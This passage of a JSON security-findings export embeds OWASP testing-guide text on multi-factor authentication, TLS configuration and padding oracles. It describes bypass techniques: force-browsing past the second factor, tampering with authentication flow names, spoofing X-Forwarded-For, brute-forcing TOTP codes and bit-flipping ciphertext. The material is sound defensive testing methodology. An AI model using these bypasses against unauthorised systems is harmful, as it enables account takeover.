factors](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication#types-of-mfa) when logging in.\nMFA adds additional complexity to both the authentication functionality, and also to other security-related areas (such as credential management and password recovery), meaning that it is critical for it to be implemented in a correct and robust manner.","TestingInstructions":"## Test Objectives\n\n* Identify the type of MFA used by the application.\n* Determine whether the MFA implementation is robust and secure.\n* Attempt to bypass the MFA.\n\n## How to Test\n\n### Types of MFA\n\nMFA means that *at least* two of the following factors are required to authentication:\n\n| Factor | Examples |\n| ------ | -------- |\n| Something You Know | Passwords, PINs and security questions. |\n| Something You Have | Hardware or software tokens, certificates, email\\*, SMS, and phone calls. |\n| Something You Are | Fingerprints, facial recognition, iris scans, handprint scans and behavioural factors. |\n| Location | Source IP ranges, and geolocation. |\n\n\\* Email only really constitutes \u201Csomething you have\u201D if the email account itself is protected with MFA. As such, it should be considered weaker than other alternatives such as certificates or TOTP, and may not be accepted as MFA under some definitions.\nNote that requiring multiple examples of a single factor (such as needing both a password and a PIN) **does not constitute MFA**, although it may provide some security benefits over a simple password, and may be considered two-step verification (2SV).\nDue to the complexity of implementing biometrics in a browser-based environment, \u201CSomething You Are\u201D is rarely used for web applications, although it is starting to be adopted using standards such as WebAuthn. The most common second factor is \u201CSomething You Have\u201D.\n\n### Check for MFA Bypasses\n\nThe first step for testing MFA is to identify all of the authentication functionality in the application, which may include:\n\n* The main login page.\n* Security critical functionality (such as disabling MFA or changing a password).\n* Federated login providers.\n* API endpoints (from both the main web interface and mobile apps).\n* Alternative (non-HTTP) protocols.\n* Test or debug functionality.\n\nAll of the different login methods should be reviewed, to ensure that MFA is enforced consistently. If some methods do not require MFA, then these can provide a simple method to bypass them.\nIf the authentication is done in multiple steps then it may be possible to bypass it by completing the first step of the authentication process (entering the username and password), and then force-browsing to the application or making direct API requests without completing the second stage (entering the MFA code).\nIf the authentication is using a OpenID Connect (OIDC) provider that allows custom authentication flows (or policies) such as Azure B2C, there may be multiple flows defined, some of which may not require MFA. For example if the application authenticates with a flow called \u0060B2C_1_SignInWithMFA\u0060, then try tampering that to \u0060B2C_1_SignIn\u0060, \u0060B2C_1_SignInWithoutMFA\u0060 or other similar values.\nIn some cases, there may also be intentional MFA bypasses implemented, such as not requiring MFA:\n\n* From specific IP addresses (which may be spoofable using the \u0060X-Forwarded-For\u0060 HTTP header).\n* When a specific HTTP header is set (such as a non-standard header like \u0060X-Debug\u0060).\n* For a specific hard-coded account (such as a \u201Croot\u201D or \u201Cbreakglass\u201D account).\n\nWhere an application supports both local and federated logins, it may be possible to bypass the MFA if there is no strong separation between these two types of accounts. For example, if a user registers a local account and configures MFA for it, but does not have MFA configured on their account on the federated login provider, it may be possible for an attacker to re-register (or link) a federated account on the target application with the same email address by compromising the user\u2019s account on the federated login provider.\nFinally, if the MFA is implemented on a different system to the main application (such as on a reverse proxy, in order to protect a legacy application that does not natively support MFA), then it may be possible to bypass it by connecting directly to the backend application server, as discussed in the guide on how to [map the application architecture](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture#content-delivery-network-cdn).\n\n### Check MFA Management\n\nThe functionality used to manage MFA from inside the user\u2019s account should be tested for vulnerabilities, including:\n\n* Is the user required to re-authenticate to remove or change MFA settings?\n* Is the MFA management functionality vulnerable to [cross-site request forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)?\n* Can other users\u2019 MFA setting be modified through [IDOR vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)?\n\n### Check MFA Recovery Options\n\nMany applications will provide users with a way to regain access to their account if they are unable to authenticate with their second factor (for example if they have lost their phone). These mechanisms can often represent a significant weakness in the application, as they effectively allow the second authentication factor to be bypassed.\n\n#### Recovery Codes\n\nSome applications will provide the user with a list of recovery or backup codes when they enable MFA, which can be used to login. These should be checked to ensure:\n\n* They are sufficiently long and complex to protect against brute-force attacks.\n* They are securely generated.\n* They can only be used once.\n* Brute-force protection is in place (such as account lockout).\n* The user is notified (via email, SMS, etc) when a code is used.\n\nSee the [\u201CBackup Codes\u201D section in the Forgotten Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html#backup-codes) for further details.\n\n#### MFA Reset Process\n\nIf the application implements an MFA reset process, this should be tested in the same way that the [password reset process](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities) is tested. It is important that this process is *at least* as strong as the MFA implementation for the application.\n\n#### Alternative Authentication\n\nSome applications will allow the user to prove their identity through other means, such as the use of [security questions](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer). This usually represents a significant weakness, as security questions provide a far lower level of security than MFA.\n\n### One-Time Passwords\n\nThe most common form of MFA is the one of One-Time Passwords (OTPs), which are typically six-digit numeric codes (although they can be longer or shorter). These can either be generated by both the server and the user (for example, with an authenticator app), or can be generated on the server and sent to the user. There are various ways that this OTP can be provided to the user, including:\n\n| Type | Description |\n| ---- | ----------- |\n| HMAC One-Time Password (HOPT) | Generates a code based on the HMAC of a secret and a shared counter. |\n| Time-based One-Time Password (TOTP) | Generates a code based on HMAC of a secret and the current time. |\n| Email | Sends a code via email. |\n| SMS | Sends a code via SMS. |\n| Phone | Sends a code via a voice call to a phone number. |\n\nThe OTP is typically entered after the user has provided their username and password. There are various checks that should be performed, including:\n\n* Is the account locked out after multiple failed MFA attempts?\n* Is the user\u2019s IP address blocked after multiple failed MFA attempts across different accounts?\n* Are failed MFA attempts logged?\n* Is the form vulnerable to injection attacks, including [SQL wildcard injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#sql-wildcard-injection)?\n\nDepending on the type of OTPs used, there are also some other specific checks that should be performed:\n\n* How are OTPs sent to user (email, SMS, phone, etc)\n    * Is there rate limiting to prevent SMS/phone spam costing money?\n* How strong are OTPs (length and keyspace)?\n* How long are OTPs valid for?\n* Are multiple OTPs valid at once?\n* Can the OTPs be used more than once?\n* Are the OTPs tied to the correct user account or is it possible to authenticate with them on other accounts?\n\n#### HOTP and TOTP\n\nHOTP and TOTP codes are both based on a secret that is shared between the server and the user. For TOTP codes, this is usually provided to the user in the form of a QR code that they scan with an authenticator app (although it can also be provided as a text secret for them to manually enter).\nWhere the secret is generated on the server, it should be checked to ensure that it is sufficiently long and complex ([RFC 4226](https://www.rfc-editor.org/rfc/rfc4226#section-4) recommends at least 160 bits), and that it is generated using a [secure random function](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation).\nWhere the secret can be provided by the user, an appropriate minimum length should be enforced, and the input should be checked for the usual injection attacks.\nTOTP codes are typically valid for 30 seconds, but some applications choose to accept multiple codes (such as the previous, current, and next codes) in order to deal with differences between the system time on the server and on the user\u2019s device. Some applications may allow multiple codes on either side of the current one, which may make it easier for an attacker to guess or brute-force the code. The table below shows the chance of successfully brute-forcing an OTP code based on an attacker being able to make 10 requests a second, for applications that accept either only the current code, or multiple codes (see [this article](https://www.codasecurity.co.uk/articles/mfa-testing#case-study---brute-forcing-totp) for the calculations behind the table).\n\n| Valid Codes | Success rate after 1 hour | Success rate after 4 hours | Success rate after 12 hours | Success rate after 24 hours |\n| ----------- | ------------------------- | -------------------------- | --------------------------- | --------------------------- |\n| 1 | 4% | 13% | 35% | 58% |\n| 3 | 10% | 35% | 72% | 92% |\n| 5 | 16% | 51% | 88% | 99% |\n| 7 | 22% | 63% | 95% | 99% |\n\n#### Email, SMS, and Phone\n\nWhere codes are generated by the server and sent to the client, the following areas should be considered:\n\n* Is the transport mechanism (email, SMS, or voice) secure enough for the application?\n* Are the codes sufficiently long and complex?\n* Are the codes generated using a [secure random function](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation)?\n* How long are the codes valid for?\n* Are multiple codes valid at once, or does generating a new code invalidate the previous one?\n    * Could this be used to block access to an account by repeatedly requesting codes?\n* Is there sufficient rate-limiting to prevent an attacker requesting large numbers of codes?\n    * Large numbers of emailed code may get the server blocked for sending spam.\n    * Large numbers of SMS or voice calls may cost money, or be used to harass a user.\n\n### Mobile Apps and Push Notifications\n\nAn alternative approach to OTP codes is to send a push notification to the user\u2019s mobile phone, which they can either approve or deny. This method is less common, as it requires the user to install an application-specific authenticator.\nProperly evaluating the security of this requires the scope of testing to be expanded to cover both the mobile app, and any supporting APIs or services used by it; meaning that it would often be outside of the scope of a traditional web application test. However, there are a couple of simple checks that can be performed without testing the mobile app, including:\n\n* Does the notification provide sufficient context (IP addresses, location, etc) for the user to make an informed decision about whether to approve or deny it?\n* Is there any kind of challenge and response mechanism (such as providing a code on the site that the user needs to enter into the app - often called \u201Cnumber matching\u201D or \u201Cnumber challenge\u201D)?\n* Is there any rate limiting or mechanisms to prevent the user from being spammed with notifications in the hope that they will just blindly accept one?\n\n### IP Address and Location Filtering\n\nOne of the factors that is sometimes used with MFA is location (\u201Csomewhere you are\u201D), although whether this constitutes a proper authentication factor is debatable. In the context of a web application, this typically means restricting access to specific IP addresses, or not prompting the user for a second factor as long as they are connecting from a specific trusted IP address. A common scenario for this would be to authenticate users with just their password when connecting from the office IP ranges, but requiring an OTP code when they connect from elsewhere.\nDepending on the implementation, it may be possible for a user to spoof a trusted IP address by setting the \u0060X-Forwarded-For\u0060 header, which could allow them to bypass this check. Note that if the application does not correctly sanitize the contents of this header, it may also be possible to carry out attack such as SQL injection here. If the application supports IPv6, then this should also be checked to ensure that appropriate restrictions are applied to those connections.\nAdditionally, the trusted IP addresses should be reviewed to ensure that they do not present any weaknesses, such as if they include:\n\n* IP addresses that could be accessible by untrusted users (such as the guest wireless networks in an office).\n* Dynamically assigned IP address that could change.\n* Public network ranges where an attacker could host their own system (such as Azure or AWS).\n\n### Certificates and Smartcards\n\nTransport Layer Security (TLS) is commonly used to encrypt traffic between the client and the server, and to provide a mechanism for the client to confirm the identity of the server (by comparing Common Name (CN) or Subject Alternative Name (SAN) on the certificate to the requested domain). However, it can also provide a mechanism for the server to confirm the identity of the client, known as client certificate authentication or mutual TLS (mTLS). A full discussion of client certificate authentication is outside of the scope of this guide, but the key principle is that the user presents a digital certificate (stored either on their machine or on a smartcard), which is validated by the server.\nThe first step when testing is to determine whether the target application restricts the Certificate Authorities (CAs) that are trusted to issue certificates. This information can be obtained using various tools, or by manually examining the TLS handshake. The simplest way is to use OpenSSL\u2019s \u0060s_client\u0060:\n\n\u0060\u0060\u0060\n$ openssl s_client -connect example:443\n[...]\nAcceptable client certificate CA names\nC = US, ST = Example, L = Example, O = Example Org, CN = Example Org Root Certificate Authority\nClient Certificate Types: RSA sign, DSA sign, ECDSA sign\n\u0060\u0060\u0060\n\nIf there are no restrictions, then it may be possible to authenticate using a certificate from a different CA. If there are restrictions but they are badly implemented, it may be possible to create a local CA with the correct name (\u201CExample Org Root Certificate Authority\u201D in the example above), and to use this new CA to sign client certificates.\nIf a valid certificate can be obtained, then it should also be verified that the certificate can only be used for the user that it is issued for (i.e, that you can\u2019t use a certificate issued to Alice to authenticate on Bob\u2019s account). Additionally, certificates should be checked to ensure that they have neither expired nor been revoked.\n\n## Related Test Cases\n\n* [Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)\n* [Testing for Weak Password Change or Reset Functionalities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nEnsure that:\n\n* MFA is implemented for all relevant accounts and functionality on the applications.\n* The support MFA methods are appropriate for the application.\n* The mechanisms used to implement MFA are appropriately secured and protected against brute-force attacks.\n* There is appropriate auditing and logging for all MFA-related activity.\n\nSee the [OWASP Multi-Factor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) for further recommendations.","References":"## References\n\n* [OWASP Multi-Factor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CRYP-01 Testing for Weak Transport Layer Security","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"When information is sent between the client and the server, it must be encrypted and protected in order to prevent an attacker from being able to read or modify it. This is most commonly done using HTTPS, which uses the [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security) protocol, a replacement for the older Secure Socket Layer (SSL) protocol. TLS also provides a way for the server to demonstrate to the client that they have connected to the correct server, by presenting a trusted digital certificate.\nOver the years there have been a large number of cryptographic weaknesses identified in the SSL and TLS protocols, as well as in the ciphers that they use. Additionally, many of the implementations of these protocols have also had serious vulnerabilities. As such, it is important to test that sites are not only implementing TLS, but that they are doing so in a secure manner.","TestingInstructions":"## Test Objectives\n\n* Validate the service configuration.\n* Review the digital certificate\u2019s cryptographic strength and validity.\n* Ensure that the TLS security is not bypassable and is properly implemented across the application.\n\n## How to Test\n\nTransport layer security related issues can be broadly split into the following areas:\n\n### Server Configuration\n\nThere are a large number of protocol versions, ciphers, and extensions supported by TLS. Many of these are considered to be legacy, and have cryptographic weaknesses, such as those listed below. Note that new weaknesses are likely to be identified over time, so this list may be incomplete.\n\n* [SSLv2 (DROWN)](https://drownattack.com/)\n* [SSLv3 (POODLE)](https://en.wikipedia.org/wiki/POODLE)\n* [TLSv1.0 (BEAST)](https://www.acunetix.com/blog/web-security-zone/what-is-beast-attack/)\n* [TLSv1.1 (Deprecated by RFC 8996)](https://tools.ietf.org/html/rfc8996)\n* [EXPORT ciphers suites (FREAK)](https://en.wikipedia.org/wiki/FREAK)\n* [NULL ciphers](https://www.rapid7.com/db/vulnerabilities/ssl-null-ciphers) ([they only provide authentication](https://tools.ietf.org/html/rfc4785)).\n* Anonymous ciphers (these may be supported on SMTP servers, as discussed in [RFC 7672](https://tools.ietf.org/html/rfc7672#section-8.2))\n* [RC4 ciphers (NOMORE)](https://www.rc4nomore.com/)\n* CBC mode ciphers (BEAST, [Lucky 13](https://en.wikipedia.org/wiki/Lucky_Thirteen_attack))\n* [TLS compression (CRIME)](https://en.wikipedia.org/wiki/CRIME)\n* [Weak DHE keys (LOGJAM)](https://weakdh.org/)\n\nThe [Mozilla Server Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS) details the protocols and ciphers that are currently recommended.\n\n#### Exploitability\n\nIt should be emphasised that while many of these attacks have been demonstrated in a lab environment, they are not generally considered practical to exploit in the real world, as they require a (usually active) MitM attack, and significant resources. As such, they are unlikely to be exploited by anyone other than nation states.\n\n### Digital Certificates\n\n#### Cryptographic Weaknesses\n\nFrom a cryptographic perspective, there are two main areas that need to be reviewed on a digital certificate:\n\n* The key strength should be *at least* 2048 bits.\n* The signature algorithm should be *at least* SHA-256. Legacy algorithms such as MD5 and SHA-1 should not be used.\n\n#### Validity\n\nAs well as being cryptographically secure, the certificate must also be considered valid (or trusted). This means that it must:\n\n* Be within the defined validity period.\n    * Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than [398 days](https://blog.mozilla.org/security/2020/07/09/reducing-tls-certificate-lifespans-to-398-days/).\n* Be signed by a trusted certificate authority (CA).\n    * This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.\n    * Don\u2019t flag internal applications as having untrusted certificates just because *your* system doesn\u2019t trust the CA.\n* Have a Subject Alternate Name (SAN) that matches the hostname of the system.\n    * The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.\n    * Make sure that you\u2019re accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).\n\nSome certificates may be issued for wildcard domains (such as \u0060*.example.org\u0060), meaning that they can be valid for multiple subdomains. Although convenient, there are a number of security concerns around this that should be considered. These are discussed in the [OWASP Transport Layer Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#carefully-consider-the-use-of-wildcard-certificates).\nCertificates can also leak information about internal systems or domain names in the Issuer and SAN fields, which can be useful when trying to build up a picture of the internal network or conduct social engineering activities.\n\n### Implementation Vulnerabilities\n\nOver the years there have been vulnerabilities in the various TLS implementations. There are too many to list here, but some of the key examples are:\n\n* [Debian OpenSSL Predictable Random Number Generator](https://www.debian.org/security/2008/dsa-1571) (CVE-2008-0166)\n* [OpenSSL Insecure Renegotiation](https://www.openssl.org/news/secadv/20091111.txt) (CVE-2009-3555)\n* [OpenSSL Heartbleed](https://heartbleed.com/) (CVE-2014-0160)\n* [F5 TLS POODLE](https://support.f5.com/csp/article/K15882) (CVE-2014-8730)\n* [Microsoft Schannel Denial of Service](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-066) (MS14-066 / CVE-2014-6321)\n\n### Application Vulnerabilities\n\nAs well as the underlying TLS configuration being securely configured, the application also needs to use it in a secure way. Some of these points are addressed elsewhere in this guide:\n\n* [Not sending sensitive data over unencrypted channels (WSTG-CRYP-03)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels)\n* [Setting the HTTP Strict-Transport-Security header (WSTG-CONF-07)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security)\n* [Setting the Secure flag on cookies (WSTG-SESS-02)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n\n#### Mixed Active Content\n\nMixed active content is when active resources (such as scripts to CSS) are loaded over unencrypted HTTP and included into a secure (HTTPS) page. This is dangerous because it would allow an attacker to modify these files (as they are sent unencrypted), which could allow them to execute arbitrary code (JavaScript or CSS) in the page. Passive content (such as images) loaded over an insecure connection can also leak information or allow an attacker to deface the page, although it is less likely to lead to a full compromise.\n\n\u003E Note: modern browsers will block active content being loaded from insecure sources into secure pages.\n\n#### Redirecting from HTTP to HTTPS\n\nMany sites will accept connections over unencrypted HTTP, and then immediately redirect the user to the secure (HTTPS) version of the site with a \u0060301 Moved Permanently\u0060 redirect. The HTTPS version of the site then sets the \u0060Strict-Transport-Security\u0060 header to instruct the browser to always use HTTPS in future.\nHowever, if an attacker is able to intercept this initial request, they could redirect the user to a malicious site, or use a tool such as [sslstrip](https://github.com/moxie0/sslstrip) to intercept subsequent requests.\nIn order to defend against this type of attack, the site must use be added to the [preload list](https://hstspreload.org/).\n\n## Automated Testing\n\nThere are a large number of scanning tools that can be used to identify weaknesses in the SSL/TLS configuration of a service, including both dedicated tools and general purpose vulnerability scanners. Some of the more popular ones are:\n\n* [Nmap](https://nmap.org/) (various scripts)\n* [OWASP O-Saft](https://owasp.org/www-project-o-saft/)\n* [sslscan](https://github.com/rbsec/sslscan)\n* [sslyze](https://github.com/nabla-c0d3/sslyze)\n* [SSL Labs](https://www.ssllabs.com/ssltest/)\n* [testssl.sh](https://github.com/drwetter/testssl.sh)\n\n### Manual Testing\n\nIt is also possible to carry out most checks manually, using command-line looks such as \u0060openssl s_client\u0060 or \u0060gnutls-cli\u0060 to connect with specific protocols, ciphers or options.\nWhen testing like this, be aware that the version of OpenSSL or GnuTLS shipped with most modern systems may will not support some outdated and insecure protocols such as SSLv2 or EXPORT ciphers. Make sure that your version supports the outdated versions before using it for testing, or you\u2019ll end up with false negatives.\nIt can also be possible to performed limited testing using a web browser, as modern browsers will provide details of the protocols and ciphers that are being used in their developer tools. They also provide an easy way to test whether a certificate is considered trusted, by browsing to the service and seeing if you are presented with a certificate warning.","Details":null,"Implication":null,"Recommendation":null,"References":"* [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n* [Mozilla Server Side TLS Guide](https://wiki.mozilla.org/Security/Server_Side_TLS)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"09-Testing for Weak Cryptography","Description":"09-Testing for Weak Cryptography","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2014080d-6a55-4189-a374-978f42561d7b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CRYP-02 Testing for Padding Oracle","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"A padding oracle is a function of an application which decrypts encrypted data provided by the client, e.g. internal session state stored on the client, and leaks the state of the validity of the padding after decryption. The existence of a padding oracle allows an attacker to decrypt encrypted data and encrypt arbitrary data without knowledge of the key used for these cryptographic operations. This can lead to leakage of sensitive data or to privilege escalation vulnerabilities, if integrity of the encrypted data is assumed by the application.\nBlock ciphers encrypt data only in blocks of certain sizes. Block sizes used by common ciphers are 8 and 16 bytes. Data where the size doesn\u2019t match a multiple of the block size of the used cipher has to be padded in a specific manner so the decryptor is able to strip the padding. A commonly used padding scheme is PKCS#7. It fills the remaining bytes with the value of the padding length.\n\n### Example 1\n\nIf the padding has the length of 5 bytes, the byte value \u00600x05\u0060 is repeated five times after the plain text.\nAn error condition is present if the padding doesn\u2019t match the syntax of the used padding scheme. A padding oracle is present if an application leaks this specific padding error condition for encrypted data provided by the client. This can happen by exposing exceptions (e.g. \u0060BadPaddingException\u0060 in Java) directly, by subtle differences in the responses sent to the client or by another side-channel like timing behavior.\nCertain modes of operation of cryptography allow bit-flipping attacks, where flipping of a bit in the cipher text causes that the bit is also flipped in the plain text. Flipping a bit in the n-th block of CBC encrypted data causes that the same bit in the (n\u002B1)-th block is flipped in the decrypted data. The n-th block of the decrypted cipher text is garbaged by this manipulation.\nThe padding oracle attack enables an attacker to decrypt encrypted data without knowledge of the encryption key and used cipher by sending skillful manipulated cipher texts to the padding oracle and observing of the results returned by it. This causes loss of confidentiality of the encrypted data. E.g. in the case of session data stored on the client-side the attacker can gain information about the internal state and structure of the application.\nA padding oracle attack also enables an attacker to encrypt arbitrary plain texts without knowledge of the used key and cipher. If the application assumes that integrity and authenticity of the decrypted data is given, an attacker could be able to manipulate internal session state and possibly gain higher privileges.","TestingInstructions":"## Test Objectives\n\n* Identify encrypted messages that rely on padding.\n* Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.\n\n## How to Test\n\n### Black-Box Testing\n\nFirst the possible input points for padding oracles must be identified. Generally the following conditions must be met:\n\n1. The data is encrypted. Good candidates are values which appear to be random.\n2. A block cipher is used. The length of the decoded (Base64 is used often) cipher text is a multiple of common cipher block sizes like 8 or 16 bytes. Different cipher texts (e.g. gathered by different sessions or manipulation of session state) share a common divisor in the length.\n\n#### Example 2\n\n\u0060Dg6W8OiWMIdVokIDH15T/A==\u0060 results after base64 decoding in \u00600e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc\u0060. This seems to be random and 16 byte long.\nIf such an input value candidate is identified, the behavior of the application to bit-wise tampering of the encrypted value should be verified. Normally this base64 encoded value will include the initialization vector (IV) prepended to the cipher text. Given a plaintext *\u0060p\u0060* and a cipher with a block size *\u0060n\u0060*, the number of blocks will be *\u0060b = ceil( length(p) / n)\u0060*. The length of the encrypted string will be *\u0060y=(b\u002B1)*n\u0060* due to the initialization vector. To verify the presence of the oracle, decode the string, flip the last bit of the second-to-last block *\u0060b-1\u0060* (the least significant bit of the byte at *\u0060y-n-1\u0060*), re-encode and send. Next, decode the original string, flip the last bit of the block *\u0060b-2\u0060* (the least significant bit of the byte at *\u0060y-2*n-1\u0060*), re-encode and send.\nIf it is known that the encrypted string is a single block (the IV is stored on the server or the application is using a bad practice hardcoded IV), several bit flips must be performed in turn. An alternative approach could be to prepend a random block, and flip bits in order to make the last byte of the added block take all possible values (0 to 255).\nThe tests and the base value should at least cause three different states while and after decryption:\n\n* Cipher text gets decrypted, resulting data is correct.\n* Cipher text gets decrypted, resulting data is garbled and causes some exception or error handling in the application logic.\n* Cipher text decryption fails due to padding errors.\n\nCompare the responses carefully. Search especially for exceptions and messages which state that something is wrong with the padding. If such messages appear, the application contains a padding oracle. If the three different states described above are observable implicitly (different error messages, timing side-channels), there is a high probability that there is a padding oracle present at this point. Try to perform the padding oracle attack to ensure this.\n\n##### Example 3\n\n* ASP.NET throws \u0060System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.\u0060 if padding of a decrypted cipher text is broken.\n* In Java a \u0060javax.crypto.BadPaddingException\u0060 is thrown in this case.\n* Decryption errors or similar can be possible padding oracles.\n\n\u003E A secure implementation will check for integrity and cause only two responses: \u0060ok\u0060 and \u0060failed\u0060. There are no side channels which can be used to determine internal error states.\n\n### Gray-Box Testing\n\nVerify that all places where encrypted data from the client, that should only be known by the server, is decrypted. The following conditions should be met by such code:\n\n1. The integrity of the cipher text should be verified by a secure mechanism, like HMAC or authenticated cipher operation modes like GCM or CCM.\n2. All error states while decryption and further processing are handled uniformly.\n\n### Example 4\n\n[Visualization of the decryption process](https://erlend.oftedal.no/blog/poet/)\n\n## Tools\n\n* [Bletchley](https://code.blindspotsecurity.com/trac/bletchley)\n* [PadBuster](https://github.com/GDSSecurity/PadBuster)\n* [Poracle](https://github.com/iagox86/Poracle)\n* [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Wikipedia - Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack)\n* [Juliano Rizzo, Thai Duong, \u201CPractical Padding Oracle Attacks\u201D](https://www.usenix.org/event/woot10/tech/full_papers/Rizzo.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"09-Testing for Weak Cryptography","Description":"09-Testing for Weak Cryptography","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2014080d-6a55-4189-a374-978f42561d7b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CRYP-03 Testing for Sensitive Information Sent via Unencrypted Channels","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not 